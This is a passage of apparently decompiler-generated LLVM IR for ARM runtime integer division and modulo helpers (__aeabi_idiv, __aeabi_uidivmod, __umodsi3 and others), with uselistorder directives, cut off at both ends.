  call void @__pseudo_branch(i32 %v0_1c250)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1c244, { 1, 0 }
  uselistorder i1 %v7_1c23c, { 1, 0 }
  uselistorder i32 %v4_1c234, { 1, 0 }
  uselistorder i32 %v1_1c234, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c228, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1c228, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c218, { 1, 0 }
  uselistorder i32 %v0_1c1f0, { 1, 0 }
  uselistorder i32 %v4_1c1e4, { 1, 0 }
  uselistorder i32 %v1_1c1ec, { 1, 2, 0 }
  uselistorder i32 %v4_1c1d8, { 1, 0 }
  uselistorder i32 %v1_1c1e0, { 1, 2, 0 }
  uselistorder i32 %v4_1c1cc, { 1, 0 }
  uselistorder i32 %v1_1c1d4, { 1, 2, 0 }
  uselistorder i32 %v1_1c1f8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1c1c8, { 1, 0 }
  uselistorder i32 %v1_1c1f4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1c1b4, { 1, 0 }
  uselistorder i32 %v3_1c1b0, { 1, 0 }
  uselistorder i32 %v1_1c1b0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1c1b4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c1a0, { 1, 0 }
  uselistorder i32 %v4_1c19c, { 2, 1, 0 }
  uselistorder i32 %v1_1c1a0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1c1a8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_1c174, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_1c200, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1c1bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c1a8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c264 = udiv i32 %arg1, %arg2
  ret i32 %v2_1c264
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1c278 = icmp slt i32 %arg2, 0
  %v2_1c278 = icmp eq i32 %arg2, 0
  %v0_1c27c = load i32, i32* @r0, align 4
  %v2_1c27c = xor i32 %v0_1c27c, %arg2
  br i1 %v2_1c278, label %dec_label_pc_1c390, label %dec_label_pc_1c284

dec_label_pc_1c284:                               ; preds = %entry
  br i1 %v1_1c278, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1c284
  %v2_1c284 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1c284, %bb
  %v1_1c350 = phi i32 [ %v2_1c284, %bb ], [ %arg2, %dec_label_pc_1c284 ]
  %v1_1c288 = add i32 %v1_1c350, -1
  %v7_1c288 = icmp eq i32 %v1_1c350, 1
  br i1 %v7_1c288, label %dec_label_pc_1c330, label %dec_label_pc_1c290

dec_label_pc_1c290:                               ; preds = %thread-pre-split
  %v1_1c290 = icmp slt i32 %v0_1c27c, 0
  br i1 %v1_1c290, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1c290
  %v2_1c294 = sub i32 0, %v0_1c27c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1c290, %bb85
  %v0_1c384 = phi i32 [ %v0_1c27c, %dec_label_pc_1c290 ], [ %v2_1c294, %bb85 ]
  %v3_1c298 = icmp uge i32 %v0_1c384, %v1_1c350
  %v9_1c298 = icmp eq i32 %v0_1c384, %v1_1c350
  %v2_1c29c = xor i1 %v3_1c298, true
  %v3_1c29c = or i1 %v9_1c298, %v2_1c29c
  br i1 %v3_1c29c, label %dec_label_pc_1c33c, label %dec_label_pc_1c2a0

dec_label_pc_1c2a0:                               ; preds = %bb86
  %v2_1c2a0 = and i32 %v1_1c288, %v1_1c350
  %v4_1c2a0 = icmp eq i32 %v2_1c2a0, 0
  br i1 %v4_1c2a0, label %dec_label_pc_1c34c, label %dec_label_pc_1c2a8

dec_label_pc_1c2a8:                               ; preds = %dec_label_pc_1c2a0
  %v3_1c2a8 = icmp ult i32 %v1_1c350, 536870912
  br i1 %v3_1c2a8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1c2a8
  %v4_1c2ac = mul i32 %v1_1c350, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1c2a8, %.thread
  %v0_1c2cc.pr40.ph = phi i32 [ %v4_1c2ac, %.thread ], [ %v1_1c350, %dec_label_pc_1c2a8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1c2a8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1c2cc.pr40 = phi i32 [ %v4_1c2c0, %bb89 ], [ %v0_1c2cc.pr40.ph, %.preheader.preheader ]
  %v1_1c2c4 = phi i32 [ %v4_1c2c4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1c2b8 = icmp ugt i32 %v0_1c2cc.pr40, 268435455
  br i1 %v2_1c2b8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1c2ccthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1c2bc = icmp ult i32 %v0_1c2cc.pr40, %v0_1c384
  br i1 %v4_1c2bc, label %bb88, label %dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1c2c0 = and i32 %v0_1c2cc.pr40, 268435456
  %v3_1c2c0 = icmp eq i32 %v2_1c2c0, 0
  %v4_1c2c0 = mul i32 %v0_1c2cc.pr40, 16
  br i1 %v3_1c2c0, label %bb89, label %dec_label_pc_1c2cc.loopexit

bb89:                                             ; preds = %bb88
  %v2_1c2c4 = and i32 %v1_1c2c4, 268435456
  %v3_1c2c4 = icmp eq i32 %v2_1c2c4, 0
  %v4_1c2c4 = mul i32 %v1_1c2c4, 16
  br i1 %v3_1c2c4, label %.preheader, label %dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit

dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1c2d852.ph = phi i32 [ %v1_1c2c4, %bb87 ], [ %v4_1c2c4, %bb89 ]
  %v0_1c2cc.pr42.ph = phi i32 [ %v0_1c2cc.pr40, %bb87 ], [ %v4_1c2c0, %bb89 ]
  br label %dec_label_pc_1c2ccthread-pre-split.loopexit

dec_label_pc_1c2ccthread-pre-split.loopexit:      ; preds = %dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1c2d852 = phi i32 [ %v1_1c2c4, %.thread3 ], [ %v1_1c2d852.ph, %dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit ]
  %v0_1c2cc.pr42 = phi i32 [ %v0_1c2cc.pr40, %.thread3 ], [ %v0_1c2cc.pr42.ph, %dec_label_pc_1c2ccthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c2ccthread-pre-split

dec_label_pc_1c2ccthread-pre-split:               ; preds = %dec_label_pc_1c2ccthread-pre-split.loopexit, %bb91
  %v1_1c2d850 = phi i32 [ %v1_1c2d852, %dec_label_pc_1c2ccthread-pre-split.loopexit ], [ %v3_1c2d8, %bb91 ]
  %v2_1c2d048 = phi i32 [ %v0_1c384, %dec_label_pc_1c2ccthread-pre-split.loopexit ], [ %v2_1c2d0, %bb91 ]
  %v0_1c2cc.pr = phi i32 [ %v0_1c2cc.pr42, %dec_label_pc_1c2ccthread-pre-split.loopexit ], [ %v3_1c2d4, %bb91 ]
  br label %dec_label_pc_1c2cc

dec_label_pc_1c2cc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1c2cc

dec_label_pc_1c2cc:                               ; preds = %dec_label_pc_1c2cc.loopexit, %dec_label_pc_1c2ccthread-pre-split
  %v1_1c2d8 = phi i32 [ %v1_1c2d850, %dec_label_pc_1c2ccthread-pre-split ], [ %v1_1c2c4, %dec_label_pc_1c2cc.loopexit ]
  %v2_1c2d0 = phi i32 [ %v2_1c2d048, %dec_label_pc_1c2ccthread-pre-split ], [ %v0_1c384, %dec_label_pc_1c2cc.loopexit ]
  %v1_1c2d4 = phi i32 [ %v0_1c2cc.pr, %dec_label_pc_1c2ccthread-pre-split ], [ %v4_1c2c0, %dec_label_pc_1c2cc.loopexit ]
  %v2_1c2cc = icmp slt i32 %v1_1c2d4, 0
  br i1 %v2_1c2cc, label %dec_label_pc_1c2e0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1c2cc
  %v4_1c2d0 = icmp ult i32 %v1_1c2d4, %v2_1c2d0
  br i1 %v4_1c2d0, label %bb91, label %dec_label_pc_1c2e0

bb91:                                             ; preds = %bb90
  %v3_1c2d4 = mul i32 %v1_1c2d4, 2
  %v2_1c2d8 = icmp slt i32 %v1_1c2d8, 0
  %v3_1c2d8 = mul i32 %v1_1c2d8, 2
  br i1 %v2_1c2d8, label %dec_label_pc_1c2e0, label %dec_label_pc_1c2ccthread-pre-split

dec_label_pc_1c2e0:                               ; preds = %bb90, %dec_label_pc_1c2cc, %bb91
  %v2_1c2ec63 = phi i32 [ %v3_1c2d8, %bb91 ], [ %v1_1c2d8, %bb90 ], [ %v1_1c2d8, %dec_label_pc_1c2cc ]
  %v1_1c2e455 = phi i32 [ %v3_1c2d4, %bb91 ], [ %v1_1c2d4, %bb90 ], [ %v1_1c2d4, %dec_label_pc_1c2cc ]
  br label %dec_label_pc_1c2e4

dec_label_pc_1c2e4:                               ; preds = %.thread13, %dec_label_pc_1c2e0
  %v1_1c318 = phi i32 [ %v4_1c318, %.thread13 ], [ %v2_1c2ec63, %dec_label_pc_1c2e0 ]
  %v1_1c2ec = phi i32 [ %v1_1c328, %.thread13 ], [ 0, %dec_label_pc_1c2e0 ]
  %v1_1c31c = phi i32 [ %v4_1c31c, %.thread13 ], [ %v1_1c2e455, %dec_label_pc_1c2e0 ]
  %v1_1c2e8 = phi i32 [ %v0_1c314, %.thread13 ], [ %v0_1c384, %dec_label_pc_1c2e0 ]
  %v3_1c2e4 = icmp ult i32 %v1_1c2e8, %v1_1c31c
  br i1 %v3_1c2e4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1c2e4
  %v3_1c2e8 = sub i32 %v1_1c2e8, %v1_1c31c
  %v3_1c2ec = or i32 %v1_1c2ec, %v1_1c318
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1c2e4, %bb92
  %v1_1c2f4 = phi i32 [ %v1_1c2e8, %dec_label_pc_1c2e4 ], [ %v3_1c2e8, %bb92 ]
  %v1_1c2f8 = phi i32 [ %v1_1c2ec, %dec_label_pc_1c2e4 ], [ %v3_1c2ec, %bb92 ]
  %v4_1c2f0 = udiv i32 %v1_1c31c, 2
  %v6_1c2f0 = icmp ult i32 %v1_1c2f4, %v4_1c2f0
  br i1 %v6_1c2f0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1c2f4 = urem i32 %v1_1c31c, 2
  %v4_1c2f4 = icmp eq i32 %v3_1c2f4, 0
  %v6_1c2f4 = sub i32 %v1_1c2f4, %v4_1c2f0
  br i1 %v4_1c2f4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1c2f8 = udiv i32 %v1_1c318, 2
  %v6_1c2f8 = or i32 %v1_1c2f8, %v5_1c2f8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1c300 = phi i32 [ %v6_1c2f4, %bb93 ], [ %v1_1c2f4, %.thread8 ], [ %v6_1c2f4, %bb94 ]
  %v1_1c304 = phi i32 [ %v1_1c2f8, %bb93 ], [ %v1_1c2f8, %.thread8 ], [ %v6_1c2f8, %bb94 ]
  %v4_1c2fc = udiv i32 %v1_1c31c, 4
  %v6_1c2fc = icmp ult i32 %v1_1c300, %v4_1c2fc
  br i1 %v6_1c2fc, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1c300 = and i32 %v1_1c31c, 2
  %v4_1c300 = icmp eq i32 %v3_1c300, 0
  %v6_1c300 = sub i32 %v1_1c300, %v4_1c2fc
  br i1 %v4_1c300, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1c304 = udiv i32 %v1_1c318, 4
  %v6_1c304 = or i32 %v1_1c304, %v5_1c304
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1c30c = phi i32 [ %v6_1c300, %bb95 ], [ %v1_1c300, %.thread9 ], [ %v6_1c300, %bb96 ]
  %v1_1c310 = phi i32 [ %v1_1c304, %bb95 ], [ %v1_1c304, %.thread9 ], [ %v6_1c304, %bb96 ]
  %v4_1c308 = udiv i32 %v1_1c31c, 8
  %v6_1c308 = icmp ult i32 %v1_1c30c, %v4_1c308
  br i1 %v6_1c308, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1c30c = and i32 %v1_1c31c, 4
  %v4_1c30c = icmp eq i32 %v3_1c30c, 0
  %v6_1c30c = sub i32 %v1_1c30c, %v4_1c308
  br i1 %v4_1c30c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1c310 = udiv i32 %v1_1c318, 8
  %v6_1c310 = or i32 %v1_1c310, %v5_1c310
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1c328 = phi i32 [ %v1_1c310, %bb97 ], [ %v1_1c310, %.thread10 ], [ %v6_1c310, %bb98 ]
  %v0_1c314 = phi i32 [ %v6_1c30c, %bb97 ], [ %v1_1c30c, %.thread10 ], [ %v6_1c30c, %bb98 ]
  %v2_1c314 = icmp eq i32 %v0_1c314, 0
  br i1 %v2_1c314, label %dec_label_pc_1c324, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1c318, 16
  br i1 %tmp, label %dec_label_pc_1c324, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1c318 = udiv i32 %v1_1c318, 16
  %v4_1c31c = udiv i32 %v1_1c31c, 16
  br label %dec_label_pc_1c2e4

dec_label_pc_1c324:                               ; preds = %thread-pre-split12, %bb99
  %v1_1c324 = icmp slt i32 %v2_1c27c, 0
  br i1 %v1_1c324, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1c324
  %v2_1c328 = sub i32 0, %v1_1c328
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1c330, %dec_label_pc_1c324, %bb100
  %v1_1c32c = phi i32 [ %v1_1c328, %dec_label_pc_1c324 ], [ %v2_1c328, %bb100 ], [ %v0_1c27c, %dec_label_pc_1c330 ], [ %v2_1c334, %bb101 ], [ %v1_1c34880, %bb103 ], [ %v2_1c344, %bb104 ]
  ret i32 %v1_1c32c

dec_label_pc_1c330:                               ; preds = %thread-pre-split
  br i1 %v1_1c278, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1c330
  %v2_1c334 = sub i32 0, %v0_1c27c
  br label %.thread16

dec_label_pc_1c33c:                               ; preds = %bb86
  br i1 %v3_1c298, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1c33c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1c33c, %bb102
  %v1_1c34880 = phi i32 [ %v0_1c27c, %dec_label_pc_1c33c ], [ 0, %bb102 ]
  br i1 %v9_1c298, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1c340 = ashr i32 %v2_1c27c, 31
  %v2_1c344 = or i32 %v4_1c340, 1
  br label %.thread16

dec_label_pc_1c34c:                               ; preds = %dec_label_pc_1c2a0
  %v2_1c34c = icmp ugt i32 %v1_1c350, 65535
  br i1 %v2_1c34c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1c34c
  %v2_1c350 = and i32 %v1_1c350, 32768
  %v3_1c350 = icmp eq i32 %v2_1c350, 0
  %v4_1c350 = udiv i32 %v1_1c350, 65536
  br i1 %v3_1c350, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1c34c
  %v0_1c35c70 = phi i32 [ %v1_1c350, %dec_label_pc_1c34c ], [ %v4_1c350, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1c360 = phi i32 [ %v0_1c35c70, %.thread19 ], [ %v4_1c350, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1c35c = icmp ugt i32 %v1_1c360, 255
  br i1 %v2_1c35c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1c360 = and i32 %v1_1c360, 128
  %v3_1c360 = icmp eq i32 %v2_1c360, 0
  %v4_1c360 = udiv i32 %v1_1c360, 256
  br i1 %v3_1c360, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1c364 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1c370 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1c364, %bb108 ]
  %v1_1c36c = phi i32 [ %v1_1c360, %bb106 ], [ %v4_1c360, %bb107 ], [ %v4_1c360, %bb108 ]
  %v2_1c368 = icmp ugt i32 %v1_1c36c, 15
  br i1 %v2_1c368, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1c36c = and i32 %v1_1c36c, 8
  %v3_1c36c = icmp eq i32 %v2_1c36c, 0
  %v4_1c36c = udiv i32 %v1_1c36c, 16
  br i1 %v3_1c36c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1c370 = add nsw i32 %v1_1c370, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1c378 = phi i32 [ %v1_1c370, %.thread20 ], [ %v1_1c370, %bb109 ], [ %v2_1c370, %bb110 ]
  %v5_1c37c = phi i32 [ %v1_1c36c, %.thread20 ], [ %v4_1c36c, %bb109 ], [ %v4_1c36c, %bb110 ]
  %v2_1c374 = icmp ugt i32 %v5_1c37c, 3
  %v7_1c374 = icmp eq i32 %v5_1c37c, 4
  %v2_1c378 = xor i1 %v7_1c374, true
  %v3_1c378 = and i1 %v2_1c374, %v2_1c378
  br i1 %v3_1c378, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1c378 = add nsw i32 %v4_1c378, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1c37c = phi i32 [ %v4_1c378, %.thread21 ], [ %v5_1c378, %bb111 ]
  %v2_1c37c = xor i1 %v2_1c374, true
  %v3_1c37c = or i1 %v7_1c374, %v2_1c37c
  br i1 %v3_1c37c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1c37c = udiv i32 %v5_1c37c, 2
  %v9_1c37c = add i32 %v4_1c37c, %v8_1c37c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1c384 = phi i32 [ %v4_1c37c, %bb112 ], [ %v9_1c37c, %bb113 ]
  %v1_1c380 = icmp slt i32 %v2_1c27c, 0
  %v6_1c384 = lshr i32 %v0_1c384, %v1_1c384
  %v2_1c388 = sub i32 0, %v6_1c384
  %v2_1c388.v6_1c384 = select i1 %v1_1c380, i32 %v2_1c388, i32 %v6_1c384
  ret i32 %v2_1c388.v6_1c384

dec_label_pc_1c390:                               ; preds = %entry
  %v0_1c390 = load i32, i32* @lr, align 4
  %v0_1c394 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1c390)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1c37c, { 1, 0 }
  uselistorder i1 %v7_1c374, { 1, 0 }
  uselistorder i32 %v4_1c36c, { 1, 0 }
  uselistorder i32 %v1_1c36c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c360, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1c360, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1c350, { 1, 0 }
  uselistorder i32 %v0_1c314, { 1, 0 }
  uselistorder i32 %v4_1c308, { 1, 0 }
  uselistorder i32 %v1_1c310, { 1, 2, 0 }
  uselistorder i32 %v4_1c2fc, { 1, 0 }
  uselistorder i32 %v1_1c304, { 1, 2, 0 }
  uselistorder i32 %v4_1c2f0, { 1, 0 }
  uselistorder i32 %v1_1c2f8, { 1, 2, 0 }
  uselistorder i32 %v1_1c31c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1c2ec, { 1, 0 }
  uselistorder i32 %v1_1c318, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1c2d8, { 1, 0 }
  uselistorder i32 %v3_1c2d4, { 1, 0 }
  uselistorder i32 %v1_1c2d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1c2d0, { 1, 0 }
  uselistorder i32 %v1_1c2d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c2c4, { 1, 0 }
  uselistorder i32 %v4_1c2c0, { 2, 1, 0 }
  uselistorder i32 %v1_1c2c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1c2cc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1c298, { 1, 0 }
  uselistorder i32 %v1_1c350, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1c27c, { 1, 0, 2 }
  uselistorder i32 %v0_1c27c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1c324, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1c2e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c2ccthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c3a4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1c3a4
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1c3b8 = add i32 %arg2, -1
  %v2_1c3b8 = icmp eq i32 %arg2, 0
  br i1 %v2_1c3b8, label %dec_label_pc_1c474, label %dec_label_pc_1c3c0

dec_label_pc_1c3c0:                               ; preds = %entry
  %v7_1c3b8 = icmp eq i32 %arg2, 1
  br i1 %v7_1c3b8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_1c3c0
  %v1_1c3c0 = load i32, i32* @r0, align 4
  %v10_1c3c0 = icmp eq i32 %v1_1c3c0, %arg2
  br i1 %v10_1c3c0, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_1c3c0, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_1c3c0 = icmp ult i32 %v1_1c3c0, %arg2
  br i1 %v4_1c3c0, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_1c3c8 = and i32 %v1_1c3b8, %arg2
  %v8_1c3c8 = icmp eq i32 %v6_1c3c8, 0
  br i1 %v8_1c3c8, label %.thread67, label %dec_label_pc_1c3d8.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1c3cc = phi i32 [ %v1_1c3c0, %bb75 ], [ 0, %.thread65 ]
  %v3_1c3cc = and i32 %v1_1c3cc, %v1_1c3b8
  br label %bb76

dec_label_pc_1c3d8.preheader:                     ; preds = %bb75
  %v2_1c3d899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1c3d899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_1c468, %bb74, %bb89, %bb84, %dec_label_pc_1c438, %.thread67
  %v5_1c3d0 = phi i32 [ %v1_1c3c0, %bb74 ], [ %v3_1c3cc, %.thread67 ], [ %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, %dec_label_pc_1c438 ], [ 0, %bb84 ], [ %v1_1c46c, %dec_label_pc_1c468 ], [ %v2_1c468, %bb89 ]
  ret i32 %v5_1c3d0

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_1c3d8.preheader
  %v0_1c3ec.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_1c3d8.preheader ], [ %v4_1c3e0, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1c3d8.preheader ], [ %v2_1c3e411, %.thread1.thread9 ]
  br label %dec_label_pc_1c3ecthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_1c3d8.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1c3e411, %.thread1.thread9 ], [ 0, %dec_label_pc_1c3d8.preheader ]
  %v0_1c3ec.pr33100 = phi i32 [ %v4_1c3e0, %.thread1.thread9 ], [ %arg2, %dec_label_pc_1c3d8.preheader ]
  %v4_1c3dc = icmp ult i32 %v0_1c3ec.pr33100, %v1_1c3c0
  br i1 %v4_1c3dc, label %bb78, label %dec_label_pc_1c3ecthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_1c3e0 = and i32 %v0_1c3ec.pr33100, 268435456
  %v3_1c3e0 = icmp eq i32 %v2_1c3e0, 0
  %v4_1c3e0 = mul i32 %v0_1c3ec.pr33100, 16
  br i1 %v3_1c3e0, label %.thread1.thread9, label %dec_label_pc_1c3ec.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1c3e411 = add i32 %storemerge101, 4
  %v2_1c3d8 = icmp ugt i32 %v4_1c3e0, 268435455
  br i1 %v2_1c3d8, label %.thread, label %bb77

dec_label_pc_1c3ecthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_1c3ecthread-pre-split.loopexit

dec_label_pc_1c3ecthread-pre-split.loopexit:      ; preds = %dec_label_pc_1c3ecthread-pre-split.loopexit.loopexit, %.thread
  %v0_1c3ec.pr3398 = phi i32 [ %v0_1c3ec.pr33.lcssa, %.thread ], [ %v0_1c3ec.pr33100, %dec_label_pc_1c3ecthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_1c3ecthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c3ecthread-pre-split

dec_label_pc_1c3ecthread-pre-split:               ; preds = %.thread4, %dec_label_pc_1c3ecthread-pre-split.loopexit
  %v1_1c3f839 = phi i32 [ %storemerge95, %dec_label_pc_1c3ecthread-pre-split.loopexit ], [ %v2_1c3f8, %.thread4 ]
  %v0_1c3ec.pr = phi i32 [ %v0_1c3ec.pr3398, %dec_label_pc_1c3ecthread-pre-split.loopexit ], [ %v3_1c3f4, %.thread4 ]
  br label %dec_label_pc_1c3ec

dec_label_pc_1c3ec.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_1c3ec

dec_label_pc_1c3ec:                               ; preds = %dec_label_pc_1c3ec.loopexit, %dec_label_pc_1c3ecthread-pre-split
  %v0_1c400.pr = phi i32 [ %v1_1c3f839, %dec_label_pc_1c3ecthread-pre-split ], [ %storemerge101, %dec_label_pc_1c3ec.loopexit ]
  %v1_1c3f4 = phi i32 [ %v0_1c3ec.pr, %dec_label_pc_1c3ecthread-pre-split ], [ %v4_1c3e0, %dec_label_pc_1c3ec.loopexit ]
  %v2_1c3ec = icmp slt i32 %v1_1c3f4, 0
  br i1 %v2_1c3ec, label %dec_label_pc_1c400, label %bb79

bb79:                                             ; preds = %dec_label_pc_1c3ec
  %v4_1c3f0 = icmp ult i32 %v1_1c3f4, %v1_1c3c0
  br i1 %v4_1c3f0, label %.thread4, label %dec_label_pc_1c400

.thread4:                                         ; preds = %bb79
  %v3_1c3f4 = mul i32 %v1_1c3f4, 2
  %v2_1c3f8 = add i32 %v0_1c400.pr, 1
  br label %dec_label_pc_1c3ecthread-pre-split

dec_label_pc_1c400:                               ; preds = %bb79, %dec_label_pc_1c3ec
  %v2_1c400 = add i32 %v0_1c400.pr, -3
  %v5_1c404 = icmp slt i32 %v0_1c400.pr, 3
  br i1 %v5_1c404, label %dec_label_pc_1c444, label %dec_label_pc_1c408

